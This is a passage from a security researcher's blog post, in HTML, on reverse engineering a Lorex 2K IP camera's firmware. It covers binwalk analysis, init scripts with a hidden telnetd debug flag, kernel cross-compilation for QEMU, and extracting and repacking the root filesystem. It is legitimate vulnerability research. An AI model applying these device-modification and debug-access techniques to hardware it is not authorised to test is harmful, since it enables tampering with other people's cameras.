@@ -1,0 +1,746 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="Introduction In the previous blog post, we have dissected the Lorex 2K IP Camera from an hardware perspective. The main objectives were to obtain an an interactive shell and extract the firmware for further analysis."><title>Not All Roads Lead to PWN2OWN - Firmware Reverse Engineering (Part 2)</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=image/png href=https://1day.dev//icon.png><link href=https://1day.dev/styles.7153093e4d1bbb584a28469cadfa3f88.min.css rel=stylesheet><link href=https://1day.dev/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://1day.dev/js/darkmode.e6934a61ff52b65bd16cdf94b370f112.min.js></script>
+<script src=https://1day.dev/js/util.9825137f5e7825e8553c68ce39ac9e44.min.js></script>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/contrib/copy-tex.min.js integrity=sha384-ww/583aHhxWkz5DEVn6OKtNiIaLi2iBRNZXfJRiY1Ai7tnJ9UXpEsyvOITVpTl4A crossorigin=anonymous></script>
+<script src=https://unpkg.com/@floating-ui/core@0.7.3></script>
+<script src=https://unpkg.com/@floating-ui/dom@0.5.4></script>
+<script src=https://1day.dev/js/popover.53ad9a087e3feeaaa12b63bfd02d923b.min.js></script>
+<script src=https://1day.dev/js/code-title.b35124ad8db0ba37162b886afb711cbc.min.js></script>
+<script src=https://1day.dev/js/clipboard.c20857734e53a3fb733b7443879efa61.min.js></script>
+<script src=https://1day.dev/js/callouts.7723cac461d613d118ee8bb8216b9838.min.js></script>
+<script>const BASE_URL="https://1day.dev/",fetchData=Promise.all([fetch("https://1day.dev/indices/linkIndex.f95908f70ec33c60c8fcda9ef7621f27.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://1day.dev/indices/contentIndex.57c5230d6cf535a95b61121ae43692b3.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const e=new URL(BASE_URL),t=e.pathname,n=window.location.pathname,s=t==n;addCopyButtons(),addTitleToCodeBlocks(),addCollapsibleCallouts(),initPopover("https://1day.dev",!1,!0);const o=document.getElementById("footer");if(o){const e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=s&&!1;drawGraph("https://1day.dev",t,[{"/moc":"#4388cc"}],t?{centerForce:1,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.5,linkDistance:1,opacityScale:3,repelForce:1,scale:1.4}:{centerForce:1,depth:1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2})}},init=(e=document)=>{addCopyButtons(),addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],macros:{'’':"'"},throwOnError:!1})}</script><script type=module>
+    import { attachSPARouting } from "https:\/\/1day.dev\/js\/router.9d4974281069e9ebb189f642ae1e3ca2.min.js"
+    attachSPARouting(init, render)
+  </script></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-BZ6HJYMG3K"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-BZ6HJYMG3K",{anonymize_ip:!1})}</script><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
+<script defer src=https://1day.dev/js/full-text-search.24827f874defbbc6d529926cbfcfb493.min.js></script><div class=singlePage><header><h1 id=page-title><a href=https://1day.dev/>👾 @kiks</a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
+<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>Not All Roads Lead to PWN2OWN - Firmware Reverse Engineering (Part 2)</h1><p class=meta>Last updated
+Dec 7, 2024</p><ul class=tags><li><a href=https://1day.dev/tags/Reverse-Engineering/>Reverse engineering</a></li></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#introduction>Introduction</a></li><li><a href=#firmware-analysis>Firmware analysis</a><ol><li><a href=#root-filesystem-analysis>Root filesystem analysis</a></li><li><a href=#just-emulate-it>Just emulate it</a></li><li><a href=#next-steps-after-the-emulation>Next steps after the emulation</a></li></ol></li><li><a href=#flashing-a-custom-firmware>Flashing a custom firmware</a><ol><li><a href=#modify-boot-parameters>Modify boot parameters</a></li><li><a href=#customize-the-root-file-system>Customize the root file system</a></li></ol></li><li><a href=#heading></a></li><li><a href=#conclusion--key-takeaways>Conclusion & key takeaways</a></li><li><a href=#references>References</a></li></ol></nav></details></aside><a href=#introduction><h2 id=introduction><span class=hanchor arialabel=Anchor># </span>Introduction</h2></a><p>In the
+<a href=https://www.hacktivesecurity.com/index.php/2024/12/10/not-all-roads-lead-to-pwn2own-hardware-hacking-part-1/ rel=noopener>previous blog post</a>, we have dissected the Lorex 2K IP Camera from an hardware perspective. The main objectives were to obtain an an interactive shell and extract the firmware for further analysis. Although the first point was not achieved due to the target hardening, we
+<a href=https://www.hacktivesecurity.com/index.php/2024/12/10/not-all-roads-lead-to-pwn2own-hardware-hacking-part-1/ rel=noopener>were able</a> to extract the firmware. Since we also had the capability to re-flash the firmware with a modified version of it, we could re-create a new version (a custom firmware) with extra debug capabilities to finally embrace the Vulnerability Discovery phase with a solid target. However, as we have introduced in the first post of this series, this was also our sentence to the overall objective (0day) failure. We were able to re-create a custom firmware with custom binaries and with an interactive shell, but with a limit of 40 seconds. The limit was, presumably, some sort of integrity validation at later stages of the booting process. Since we were able to execute arbitrary commands to the target system through a customized firmware, we were thinking that we were just a little bit far from a stable shell. This &ldquo;little far&rdquo; turns out into the reversing (and emulation) of the whole filesystem image, multiple ARM32 binaries and kernel modules that were also patched to bypass what we thought was the root cause of the reboot trigger. This whole process took us too much time and effort (~75%) compared to what we have allocated for the whole project (two weeks). However, it was a really instructive, fun and interesting experience and that&rsquo;s why today we are sharing further details. If you are interested in using binwalk, qemu, bash/python scripting, dd, Binary Ninja, Ghidra, cross compiling and these topics, hope you will enjoy this post.</p><a href=#firmware-analysis><h2 id=firmware-analysis><span class=hanchor arialabel=Anchor># </span>Firmware analysis</h2></a><p>From the
+<a href=https://www.hacktivesecurity.com/index.php/2024/12/10/not-all-roads-lead-to-pwn2own-hardware-hacking-part-1/ rel=noopener>last blog post</a>, we have extracted the firmware blob that we have directly passed to
+<a href=https://github.com/ReFirmLabs/binwalk rel=noopener>binwalk</a> to search for the first signals of self contained images. binwalk is a really interesting and helpful tool that can be used to identify images mainly through magic bytes inside a blob of data. Usually, a
+<a href=https://en.wikipedia.org/wiki/Firmware rel=noopener>firmware</a> is a just series of bytes that comprehends at least the boot loader, the kernel, the root filesystem and a series of filesystem images that can be mounted and used to store multiple types of data based on the needs.</p><p><img src=/notes/images/pwn2own-23/1.png width=auto></p><p>With this output, we have clearer overview of self contained images in the firmware. binwalk offers the <code>-E</code> option that permits to automatically extract all images that it is able to identify in the data. Usually, this is enough to have a valid working image but you have to trust its extraction process (more on that later). By extracting the whole content, an interesting file called <code>partitionV2.txt</code>, part of the firmware image, contains the partitioning map of the image:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl># Version=3
+</span></span><span class=line><span class=cl>#       name                cs         offset              size         mask_flags     fs_flags      fs_type         mount_cmd                                                        backup_off
+</span></span><span class=line><span class=cl>  U-Boot,             0, 0x0000000000000000,    0x0000000000030000,             RW,                ,             ,                           ,                                        0xffffffffffffffff,
+</span></span><span class=line><span class=cl>  hwid,               0, 0x0000000000030000,    0x0000000000010000,             RW,            ,                 ,               ,                                                    0xffffffffffffffff,
+</span></span><span class=line><span class=cl>  partition,          0, 0x0000000000040000,    0x0000000000010000,             RW,                        R,            cramfs,         ,                                            0xffffffffffffffff,
+</span></span><span class=line><span class=cl>  Kernel,             0, 0x0000000000050000,    0x0000000000150000,             RW,            ,                 ,               ,                                                    0xffffffffffffffff,
+</span></span><span class=line><span class=cl>  romfs,              0, 0x00000000001A0000,    0x0000000000610000,             RW,            R,            squashfs,       ,                                                        0xffffffffffffffff,
+</span></span><span class=line><span class=cl>  config,             0, 0x00000000007B0000,    0x0000000000050000,                 RW,            RW,           jffs2,          &#34;mnt_jffs2 /dev/mtdblock5 /mnt/mtd jffs2&#34;,           0xffffffffffffffff,
+</span></span></code></pre></td></tr></table></div></div><p>With that information, combined with guessed (and retrieved) information from <code>binwalk</code>, we can clearly identify key parts of the image: the bootloader that starts at <code>0x0</code>, the kernel at <code>0x50000</code> and the root file-system (<code>romfs</code>) at <code>0x1A0000</code>. Apart of these key parts of the firmware also other partitions were identified with their offset, size and file-system type (cramfs, jfss2 and squashfs): hwid, partition, config.</p><a href=#root-filesystem-analysis><h3 id=root-filesystem-analysis><span class=hanchor arialabel=Anchor># </span>Root filesystem analysis</h3></a><p>One of the most interesting things from a firmware image of an embedded device, from a vulnerability hunting point of view, is the root file system. Here we find main binaries and services that are exposed in the target device (web services, custom protocols, <em>backdoors</em>, ..). Starting from the init scripts (scripts and binaries that are executed just after the kernel initialization phase) is a good starting point to have an initial clue of the product inner workings. The <code>/etc/initab</code> file tells us that <code>/etc/init.d/dnode</code> and <code>/etc/init.d/rcS</code> are executed at the system startup. The <code>dnode</code> script is responsible to mount previously mentioned filesystems through <code>mount -a</code> (with partitions configured in the <code>fstab</code> file), configure some character devices and adjust some directory permissions. However, the most interesting init script is <code>rcS</code>. Its responsibility is to configure the whole system, load kernel modules (from other scripts) and start all product services.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=c1># ...</span>
+</span></span><span class=line><span class=cl><span class=nv>KEYBOARD</span><span class=o>=</span><span class=m>0</span>
+</span></span><span class=line><span class=cl><span class=nv>CMDLINE</span><span class=o>=</span><span class=s2>&#34;/proc/BootInfo/bootpara&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>KEYBOARD</span><span class=o>=</span><span class=sb>`</span>cat <span class=nv>$CMDLINE</span><span class=sb>`</span>
+</span></span><span class=line><span class=cl><span class=nv>KEYBOARD</span><span class=o>=</span><span class=si>${</span><span class=nv>KEYBOARD</span><span class=p>##*dh_keyboard:</span><span class=si>}</span>
+</span></span><span class=line><span class=cl><span class=nv>KEYBOARD</span><span class=o>=</span><span class=si>${</span><span class=nv>KEYBOARD</span><span class=p>%%ethaddr*</span><span class=si>}</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=nv>$KEYBOARD</span> <span class=o>==</span> <span class=s1>&#39;1&#39;</span> <span class=o>]</span><span class=p>;</span><span class=k>then</span>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;keyboard = 1&#34;</span>
+</span></span><span class=line><span class=cl>    ln -s /dev/null /dev/mytty
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>else</span>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;keyboard = 0&#34;</span>
+</span></span><span class=line><span class=cl>    ln -s /dev/ttyS0 /dev/mytty
+</span></span><span class=line><span class=cl><span class=k>fi</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 生产程序启动telnetd</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> -f /usr/data/imgFlag <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl>    /sbin/telnetd <span class=p>&amp;</span>
+</span></span><span class=line><span class=cl><span class=k>fi</span>
+</span></span><span class=line><span class=cl><span class=c1># ...</span>
+</span></span></code></pre></td></tr></table></div></div><p>The <em>partial</em> <code>rcS</code> content below shows some interesting key points. The <code>/proc/BootInfo/bootpara</code> and <code>/usr/data/imgFlag</code> files are used to enable some debug capabilities. The first retrieves the <code>KEYBOARD</code> value and this can be potentially set from the bootloader argument, but we were not able to dynamically modify bootloader parameters at boot time (neither in the firmware image directly as we will see later). If set, as the default production configuration, the tty is symlinked to <code>/dev/null</code> and for that reason, we couldn&rsquo;t see a lot of logs from the UART interface.
+The second file <code>/usr/data/imgFlag</code> seems really interesting because it&rsquo;s a clear and straightforward way to enable some debug capabilities executing <code>telnetd</code> in background. However, <code>/sbin/telnetd</code> in the file-system image is a symlink to busybox and, the installed version of busybox in the firmware did not supported telnet. Hence, also by executing <code>telnetd</code> (or enabling that debug capability creating the file) we would not be able to spawn the telnet service.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># ...</span>
+</span></span><span class=line><span class=cl>/usr/etc/imod
+</span></span><span class=line><span class=cl><span class=c1># ...</span>
+</span></span><span class=line><span class=cl><span class=nv>APPAUTO</span><span class=o>=</span><span class=m>0</span>
+</span></span><span class=line><span class=cl><span class=nv>CMDLINE</span><span class=o>=</span><span class=s2>&#34;/proc/BootInfo/bootpara&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>APPAUTO</span><span class=o>=</span><span class=sb>`</span>cat <span class=nv>$CMDLINE</span><span class=sb>`</span>
+</span></span><span class=line><span class=cl><span class=nv>APPAUTO</span><span class=o>=</span><span class=si>${</span><span class=nv>APPAUTO</span><span class=p>##*appauto:</span><span class=si>}</span>
+</span></span><span class=line><span class=cl><span class=nv>APPAUTO</span><span class=o>=</span><span class=si>${</span><span class=nv>APPAUTO</span><span class=p>%%dh_keyboard*</span><span class=si>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=nv>$APPAUTO</span> <span class=o>==</span> <span class=s1>&#39;1&#39;</span> <span class=o>]</span><span class=p>;</span><span class=k>then</span>
+</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;appauto=1&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#dh_keyboard位是1时将sonia的输出屏蔽掉</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> <span class=nv>$KEYBOARD</span> <span class=o>=</span> <span class=s1>&#39;1&#39;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl>        /usr/bin/sonia <span class=nv>$sonia_para</span> 2&gt;/dev/null 1&gt;/dev/null
+</span></span><span class=line><span class=cl>    <span class=k>else</span>
+</span></span><span class=line><span class=cl>        /usr/bin/sonia <span class=nv>$sonia_para</span>
+</span></span><span class=line><span class=cl>    <span class=k>fi</span>
+</span></span><span class=line><span class=cl><span class=k>else</span>
+</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;appauto=0&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> <span class=nv>$KEYBOARD</span> <span class=o>==</span> <span class=s1>&#39;1&#39;</span> <span class=o>]</span><span class=p>;</span><span class=k>then</span>
+</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;keyboard = 1&#34;</span>
+</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=o>[</span> <span class=m>1</span> <span class=o>]</span>
+</span></span><span class=line><span class=cl>	<span class=k>do</span>
+</span></span><span class=line><span class=cl>		busybox sleep <span class=m>60</span>
+</span></span><span class=line><span class=cl>	<span class=k>done</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span>
+</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=s2>&#34;keyboard = 0&#34;</span>
+</span></span><span class=line><span class=cl>        sh
+</span></span><span class=line><span class=cl>    <span class=k>fi</span>
+</span></span><span class=line><span class=cl><span class=k>fi</span>
+</span></span></code></pre></td></tr></table></div></div><p>The <code>rcS</code> script also executes <code>/usr/etc/imod</code> that is mainly responsible to load kernel modules, but we will treat that argument later. The last code from the <code>rcS</code> init script responsible to start the main binary <code>/usr/bin/sonia</code> in two different ways based on specific parameters (<code>APPAUTO</code> and <code>KEYBOARD</code>) as can be seen. Almost all services in the Lorex 2K IP Camera are handled directly from that fat binary. For that reason, we nickamed it &ldquo;sonia-centric&rdquo;.</p><p>After that quick overview of the IP Camera boot process, we wanted to achieve two things: emulate it and customize the firmware for a stable working environment. Let&rsquo;s start with the emulation process that was useful for the second part.</p><a href=#just-emulate-it><h3 id=just-emulate-it><span class=hanchor arialabel=Anchor># </span>Just emulate it</h3></a><p>The title of this chapter is inspired from the article
+<a href=https://www.zerodayinitiative.com/blog/2020/5/27/mindshare-how-to-just-emulate-it-with-qemu rel=noopener>How to “Just Emulate It With QEMU”</a> that demonstrates how &ldquo;just emulate it with qemu&rdquo; is not always an easy task.
+When starting to dive into something is always important to keep the objective in mind, and in our case the emulation goal was to have a working emulated environment for debugging and (why not) fuzzing and exploitation purposes. This part is not intended to be a 101 on how to use qemu because there are plenty of public resources but will discuss the approach. In order to emulate a system in qemu we need two basic things: a <strong>kernel</strong> and a <strong>root file system</strong>. We already have the root file system (from the firmware) and potentially also the kernel (remember the firmware structure?). However, the kernel is usually compiled specifically for a board and honestly, since we were not planning to attack the kernel directly, a manual compiled kernel was more than enough and easier to build and debug.</p><a href=#just-compile-the-kernel><h4 id=just-compile-the-kernel><span class=hanchor arialabel=Anchor># </span>Just compile the kernel</h4></a><p>From the firmware image we retrieve the exact kernel version and from the identified SOC the exact architecture: Linux 4.9.84 on ARM32 EABI . With that information, we can configure necessary toolchains (from apt as shown below or directly from
+<a href=https://releases.linaro.org/components/toolchain/binaries/4.9-2017.01/arm-eabi/gcc-linaro-4.9.4-2017.01-x86_64_arm-eabi.tar.xz rel=noopener>linaro repositories</a>), download the exact kernel version from kernel.org, apply a
+<a href=https://github.com/BPI-SINOVOIP/BPI-M4-bsp/issues/4 rel=noopener>little patch</a> for a known compilation issue, configure the kernel with <code>vexpress_defconfig</code> config specifying the cross compilation option with <code>arm-linux-gnueabi-</code>, remove <code>SMP</code> and <code>PREEMPT</code> (to match as much as possible the real target) and finally compile it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo apt-get install build-essential libncurses-dev bison flex libssl-dev libelf-dev
+</span></span><span class=line><span class=cl>sudo apt install gcc-arm-linux-gnueabi
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>wget https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.9.84.tar.xz
+</span></span><span class=line><span class=cl>tar -xvf linux-4.9.84.tar.xz
+</span></span><span class=line><span class=cl><span class=nb>cd</span> linux-4.9.84/
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## apply the patch (https://github.com/BPI-SINOVOIP/BPI-M4-bsp/issues/4)</span>
+</span></span><span class=line><span class=cl>vim scripts/dtc/dtc-lexer.l
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>make <span class=nv>ARCH</span><span class=o>=</span>arm <span class=nv>CROSS_COMPILE</span><span class=o>=</span>arm-linux-gnueabi- vexpress_defconfig
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;CONFIG_SMP=n&#34;</span> &gt;&gt; .config
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;CONFIG_PREEMPT=y&#34;</span> &gt;&gt; .config
+</span></span><span class=line><span class=cl>make <span class=nv>ARCH</span><span class=o>=</span>arm <span class=nv>CROSS_COMPILE</span><span class=o>=</span>arm-linux-gnueabi- olddefconfig
+</span></span><span class=line><span class=cl>make <span class=nv>ARCH</span><span class=o>=</span>arm <span class=nv>CROSS_COMPILE</span><span class=o>=</span>arm-linux-gnueabi- -j <span class=k>$(</span>nproc<span class=k>)</span>
+</span></span></code></pre></td></tr></table></div></div><a href=#just-use-the-firmware-image><h4 id=just-use-the-firmware-image><span class=hanchor arialabel=Anchor># </span>Just use the firmware image</h4></a><p>We have a compiled kernel, now we <em>just need</em> to use the extracted firmware image as the root file system. However, we wanted to apply some changes in order to have more control over our environment and for that, we had to <em>unsquash</em> and <em>resquash</em> the image. As we have seen before, we can easily extract images from a data blob using binwalk. However, you have to trust its (reliable but automated) extraction process. We can use <code>dd</code> to precisely extract the root file system (of type squashfs) from the firmware directly using parameters identified in the <code>partitionV2.txt</code> file previously shown. With the extracted image we can now <em>unsquash</em> it (<code>unsquashfs</code>), modify the content and <em>re-squash</em> it (<code>mksquashfs</code>)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>squashfs_size</span><span class=o>=</span><span class=m>6356992</span> <span class=c1># partitionV2.txt</span>
+</span></span><span class=line><span class=cl><span class=nv>squashfs_offset</span><span class=o>=</span><span class=m>1703936</span>
+</span></span><span class=line><span class=cl>dd <span class=k>if</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$fw_original</span><span class=s2>&#34;</span> <span class=nv>of</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$squashfs_original</span><span class=s2>&#34;</span> <span class=nv>bs</span><span class=o>=</span><span class=m>1</span> <span class=nv>skip</span><span class=o>=</span><span class=nv>$squashfs_offset</span> <span class=nv>count</span><span class=o>=</span><span class=nv>$squashfs_size</span>
+</span></span></code></pre></td></tr></table></div></div><p>With that, we can reliable extract the image and make appropriate changes for our emulated environment needs since the original firmware is restricted in many ways. For example, we can cross-compile a more complete busybox binary version in order to have more available commands, gdb and so on.
+Instead of <em>squashing</em> the image every time, it is also possible to quickly create an initramfs from it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>BACK</span><span class=o>=</span><span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span>
+</span></span><span class=line><span class=cl><span class=nv>TOP</span><span class=o>=</span><span class=k>$(</span>realpath ./image/<span class=k>)</span>
+</span></span><span class=line><span class=cl><span class=nb>cd</span> <span class=nv>$TOP</span>/squashfs-root/
+</span></span><span class=line><span class=cl>find . <span class=p>|</span> cpio -H newc -o &gt; ../initramfs.cpio
+</span></span><span class=line><span class=cl><span class=nb>cd</span> ..
+</span></span><span class=line><span class=cl>cat initramfs.cpio <span class=p>|</span> gzip &gt; <span class=nv>$TOP</span>/initramfs.gz
